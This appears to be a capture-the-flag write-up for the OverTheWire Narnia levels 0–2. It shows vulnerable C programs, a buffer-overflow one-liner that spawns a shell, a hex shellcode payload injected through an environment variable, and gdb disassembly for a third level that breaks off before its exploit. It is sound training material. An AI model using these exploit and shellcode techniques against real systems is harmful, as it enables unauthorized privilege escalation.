1 **narnia0:**
We're given narnia.c:
```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

Identifying a buffer-overflow vulnerability at `char buf[20]`, we can exploit this to execute the shell. Looking at the program structure, we'll overwrite the `val` variable with the needed value of `0xdeadbeef` by exploiting the `scanf("%24s", &buf)`. 

We'll write the following exploit script to achieve this: 

```
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
```

Following successful execution, we gain a shell with elevated privileges, and we can navigate to the passwords directory to find the password: ***

**narnia1**

We're given narnia1.c: 
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

Seeing the hint to execute something at EGG, we can use the `export EGG=` to assign a value there. We also see that the program executes whatever is stored inside `EGG`, so we can try placing shellcode there. 

Checking the host OS with `uname -a`, we see that the machine is an x86 64Bit machine.

We can retrieve a shellcode to use from `shell-storm.org` and find one that matches our host architecture. We'll use `https://shell-storm.org/shellcode/files/shellcode-491.html`.

We'll craft the following payload for the `EGG` file:
```
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81")')
```

After setting that, we'll run `./narnia1` and allow the program to execute our shellcode, spawning an escalated shell. We retrieve the password ***.

**narnia2**

We're given narnia2.c: 

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

Here, we can recognize a buffer overflow vulnerability on the `strcpy(buf,argv[1]);` line.

```
Reading symbols from ./narnia2...
(No debugging symbols found in ./narnia2)
```

Using `disassemble _start, we find the location of main:`

```c
(gdb) disassemble _start
Dump of assembler code for function _start:
   0x08049070 <+0>:	xor    %ebp,%ebp
   0x08049072 <+2>:	pop    %esi
   0x08049073 <+3>:	mov    %esp,%ecx
   0x08049075 <+5>:	and    $0xfffffff0,%esp
   0x08049078 <+8>:	push   %eax
   0x08049079 <+9>:	push   %esp
   0x0804907a <+10>:	push   %edx
   0x0804907b <+11>:	call   0x8049099 <_start+41>
   0x08049080 <+16>:	add    $0x2160,%ebx
   0x08049086 <+22>:	push   $0x0
   0x08049088 <+24>:	push   $0x0
   0x0804908a <+26>:	push   %ecx
   0x0804908b <+27>:	push   %esi
   0x0804908c <+28>:	lea    -0x2143(%ebx),%eax
   0x08049092 <+34>:	push   %eax
   0x08049093 <+35>:	call   0x8049030 <__libc_start_main@plt>
   0x08049098 <+40>:	hlt
   0x08049099 <+41>:	mov    (%esp),%ebx
   0x0804909c <+44>:	ret
   0x0804909d <+45>:	jmp    0x8049186 <main> 
   ^^^ i see main
```

We see that main is at `0x8049186`. Running `disassemble 0x8049186`, we can identify key lines of code in the assembly: 

```
(gdb) disassemble 0x8049186
Dump of assembler code for function main:
   0x08049186 <+0>:	push   %ebp
   0x08049187 <+1>:	mov    %esp,%ebp
   0x08049189 <+3>:	add    $0xffffff80,%esp
   0x0804918c <+6>:	cmpl   $0x1,0x8(%ebp)
   0x08049190 <+10>:	jne    0x80491ac <main+38>
   0x08049192 <+12>:	mov    0xc(%ebp),%eax
   0x08049195 <+15>:	mov    (%eax),%eax
   0x08049197 <+17>:	push   %eax
   0x08049198 <+18>:	push   $0x804a008
   0x0804919d <+23>:	call   0x8049040 <printf@plt>
   0x080491a2 <+28>:	add    $0x8,%esp
   0x080491a5 <+31>:	push   $0x1
   0x080491a7 <+33>:	call   0x8049060 <exit@plt>
   0x080491ac <+38>:	mov    0xc(%ebp),%eax
   0x080491af <+41>:	add    $0x4,%eax
   0x080491b2 <+44>:	mov    (%eax),%eax
   0x080491b4 <+46>:	push   %eax
   0x080491b5 <+47>:	lea    -0x80(%ebp),%eax
   0x080491b8 <+50>:	push   %eax
   0x080491b9 <+51>:	call   0x8049050 <strcpy@plt>
   0x080491be <+56>:	add    $0x8,%esp
   0x080491c1 <+59>:	lea    -0x80(%ebp),%eax
   0x080491c4 <+62>:	push   %eax
   0x080491c5 <+63>:	push   $0x804a01c
   0x080491ca <+68>:	call   0x8049040 <printf@plt>
   0x080491cf <+73>:	add    $0x8,%esp
   0x080491d2 <+76>:	mov    $0x0,%eax
   0x080491d7 <+81>:	leave
   0x080491d8 <+82>:	ret
```

The buf here: `   0x08049189 <+3>:	add    $0xffffff80,%esp`, and the vulnerable line here: `0x080491b9 <+51>:	call   0x8049050 <strcpy@plt>`

We can use `b *0x8049050` to stop right before the vulnerable call and inspect the stack.

Identifying that the `eip` is at `0xffffda0c`, we can attempt to execute a buffer overflow. 

...